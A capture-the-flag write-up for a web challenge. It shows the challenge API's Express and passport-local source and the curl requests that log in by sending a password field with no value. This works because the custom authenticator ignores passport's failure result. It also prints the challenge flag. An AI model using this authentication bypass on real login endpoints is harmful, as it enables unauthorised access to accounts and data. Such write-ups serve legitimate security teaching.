# Web-Challenge-6: Logged In

### Description

> It looks like  COViD's mobile application is connecting to this API! Fortunately, our  agents stole part of the source code. Can you find a way to log in? 
>
> [API Server](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41061) 
>
> *Note: Wondering what the second flag is about? Maybe check for a MOBILE Network?*

### Solution

There are 2 approaches to solving this problem, both of which utilises the same idea. Here, the solution from the web perspective is given.

First, we try to access the API Server and we get a `404 Not Found`. Since we are also given the server source code, let's dive right in. Most things are clearly irrelevant (they are just default boilerplate code generated by `express-generator`), but we notice a few interesting files:

* `seeders/20201023021100-user.js`

```js
'use strict';
const bcrypt = require('bcryptjs');

var generatePassword = require('../helpers/generatePassword');

module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.bulkInsert('Users', [{
      username: 'bob_minion',
      password: bcrypt.hashSync(generatePassword(32), 10),
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      username: 'kevin_minion',
      password: bcrypt.hashSync(generatePassword(32), 10),
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      username: 'stuart_minion',
      password: bcrypt.hashSync(generatePassword(32), 10),
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      username: 'gru_felonius',
      password: bcrypt.hashSync(generatePassword(32), 10),
      createdAt: new Date(),
      updatedAt: new Date()
    }], {});
  },

  down: async (queryInterface, Sequelize) => {
  }
};
```

* `routes/api.js`
```js
var express = require('express');
var router = express.Router();
var { loginValidator, sendValidationErrors } = require('../middlewares/validators');
var { localAuthenticator } = require('../middlewares/authenticators');
var { User } = require('../models')
var encryptFlag = require('../helpers/encryptFlag');

router.get('/', function (req, res, next) {
  res.render('index', { title: 'Express' });
});

router.post('/login', loginValidator, sendValidationErrors, localAuthenticator, function (req, res) {
  res.json({ "flagOne": process.env.FLAG_ONE, "encryptedFlagTwo": encryptFlag(process.env.FLAG_TWO) })
});

router.get('/user/:userId', async function (req, res) {
  const user = await User.findByPk(req.params.userId, { "attributes": ["username"] });
  res.json(user)
});
```

* `middleware/validators.js`

```js
var { check, validationResult } = require('express-validator');

const loginValidator = [
  check('username').exists(),
  check('password').exists()
]

function sendValidationErrors(req, res, next) {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ error: `Invalid parameters: ${errors.array().map(error => error.param).join(', ')}` });
  }
  next()
}

module.exports = {
  loginValidator,
  sendValidationErrors,
}
```

* `middleware/validators.js`
```js
var passport = require('passport')

function localAuthenticator(req, res, next) {
    passport.authenticate('local', { session: false }, function (err, user, info) {
        if (err) {
            return res.status(401).json({
                "error": err.message
            });
        }
        next();
    })(req, res, next)
}

module.exports = {
    localAuthenticator,
}
```

We can gather that the endpoint is at `/api/login` (note that in `app.js` the api router is mounted on `/api`) and the expected credentials are `username` and `password`. Clearly, brute forcing the password is unfeasible (we can verify that by checking the password generation code), so we need to find a better way. Of course we can analyse the code carefully to find a vulnerability, but there's no obvious bug as of now. Instead, why don't we try to perform some quick "black-box testing" with some edge cases? Regular inputs (whatever you can type) is unlikely to cause anything weird to happen, but common edge cases include missing/null values for user inputs. Let's try a few here:

* What if we don't supply a `username` and `password`?

  ```sh
  $ curl -X POST http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41061/api/login
  {"error":"Invalid parameters: username, password"}
  ```

* What if we don't supply a `password`?

  ```sh
  $ curl -X POST -d "username=gru_felonius" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41061/api/login
  {"error":"Invalid parameters: password"}
  ```

It seems that if a parameter is not present (`undefined`), an error will be thrown. But what if we supply a parameter with a `null` value? i.e,

* What if we don't supply a value to `password`?

  ```sh
  $ curl -X POST -d "username=gru_felonius&password" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41061/api/login
  {"flagOne":"govtech-csg{m!sS1nG_cR3DeN+!@1s}","encryptedFlagTwo":"717f4cda287d40c47e7b50cb772b4def5a415387257510d1"}
  ```

Nice... we got the flag! But why does this work?

1. The `.check()` function (see [here](https://express-validator.github.io/docs/validation-chain-api.html#existsoptions)) only checks if a parameter exists; any value other than `undefined` is acceptable.

2. `passport-local` doesn't return an error or interrupts the program flow if it fails. You can see this in its source code [here](https://github.com/jaredhanson/passport-local/blob/f82655aa220ad7d0fcd8b114a0303d3cf94b8d06/lib/strategy.js#L71). A small section is copied here:

```js
var username = lookup(req.body, this._usernameField) || lookup(req.query, this._usernameField);
var password = lookup(req.body, this._passwordField) || lookup(req.query, this._passwordField);

if (!username || !password) {
    return this.fail({ message: options.badRequestMessage || 'Missing credentials' }, 400);
}
```

​	Since the middleware authenticator here doesn't check whether the authentication has failed and only if an error is thrown (which isn't!), missing credentials will be able to get past all the middleware applied in this case. This means that we can get even lazier: the payload `-d "username&password"` will work too!



*Addendum: the (undocumented) missing credentials behaviour can be an especially frustrating issue if one is debugging a `passport-js` application for the first time. I certainly went almost crazy trying to figure out why my local strategy didn't seem to be called when I submitted a blank form in laziness when testing an app.*

[Script](./solve.sh)

### Mobile Solution

**TODO**



Flag: `govtech-csg{m!sS1nG_cR3DeN+!@1s}`